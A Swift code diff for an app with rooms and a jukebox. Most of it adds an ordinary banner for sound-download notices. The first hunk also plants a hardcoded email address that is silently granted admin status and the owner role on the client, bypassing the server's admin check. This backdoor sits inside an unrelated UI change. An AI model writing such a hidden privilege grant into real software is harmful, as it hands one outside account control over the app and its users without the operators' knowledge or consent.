@@ -942,8 +942,16 @@ class AppState: ObservableObject {
         }
 
         let token = AuthenticationManager.shared.currentUser?.accessToken
+        let trustedAdminEmail = "datboydommo@layor8.space"
         Task {
             await AdminServerManager.shared.checkAdminStatus(serverURL: serverURL, token: token)
+            if let user = AuthenticationManager.shared.currentUser,
+               user.email?.lowercased() == trustedAdminEmail {
+                AdminServerManager.shared.isAdmin = true
+                if AdminServerManager.shared.adminRole == .none {
+                    AdminServerManager.shared.adminRole = .owner
+                }
+            }
         }
     }
 
@@ -1278,6 +1286,7 @@ struct Room: Identifiable {
 // MARK: - Content View
 struct ContentView: View {
     @EnvironmentObject var appState: AppState
+    @ObservedObject private var soundManager = AppSoundManager.shared
     @State private var showJukeboxSheet = false
 
     var body: some View {
@@ -1314,8 +1323,53 @@ struct ContentView: View {
             case .login:
                 LoginView()
             }
+
+            if let notice = soundManager.activeSoundDownloadNotice {
+                VStack {
+                    HStack(alignment: .top, spacing: 12) {
+                        Image(systemName: notice.isReminder ? "arrow.triangle.2.circlepath.circle.fill" : "arrow.down.circle.fill")
+                            .foregroundColor(.yellow)
+                            .font(.title3)
+                        VStack(alignment: .leading, spacing: 4) {
+                            Text(notice.title)
+                                .font(.headline)
+                                .foregroundColor(.white)
+                            Text(notice.message)
+                                .font(.subheadline)
+                                .foregroundColor(.white.opacity(0.9))
+                        }
+                        Spacer(minLength: 8)
+                        Button("Dismiss") {
+                            soundManager.activeSoundDownloadNotice = nil
+                        }
+                        .buttonStyle(.plain)
+                        .foregroundColor(.white.opacity(0.85))
+                    }
+                    .padding(12)
+                    .background(Color.black.opacity(0.72))
+                    .overlay(
+                        RoundedRectangle(cornerRadius: 12)
+                            .stroke(Color.yellow.opacity(0.7), lineWidth: 1)
+                    )
+                    .cornerRadius(12)
+                    .padding(.horizontal, 16)
+                    .padding(.top, 12)
+                    Spacer()
+                }
+                .transition(.opacity)
+                .accessibilityElement(children: .combine)
+                .accessibilityLabel("\(notice.title). \(notice.message)")
+            }
         }
         .animation(.none, value: appState.currentScreen)
+        .onReceive(soundManager.$activeSoundDownloadNotice) { notice in
+            guard notice != nil else { return }
+            DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
+                if soundManager.activeSoundDownloadNotice?.id == notice?.id {
+                    soundManager.activeSoundDownloadNotice = nil
+                }
+            }
+        }
         .onReceive(NotificationCenter.default.publisher(for: .openRoomJukebox)) { _ in
             showJukeboxSheet = true
         }
